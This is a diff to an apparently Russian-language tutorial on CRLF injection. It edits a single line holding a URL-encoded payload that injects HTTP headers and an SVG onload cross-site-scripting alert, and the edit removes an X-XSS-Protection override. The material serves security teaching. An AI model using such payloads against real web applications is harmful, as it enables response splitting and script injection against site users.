@@ -53,7 +53,7 @@ CRLF-injection представляет собой тип атаки, испол
  
  Рисунок 5. Информация, которую получает пользователь до подмены.
 
-Меняем заголовок: `%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0aYou are hacked%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e`
+Меняем заголовок: `%0d%0aContent-Length:35%0d%0a%0d%0aYou are hacked%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e`
 
 ![Процесс подмены информации1.png](https://github.com/karpuna3/shift2019/blob/master/crlf/img/Процесс%20подмены%20информации1.png)
 
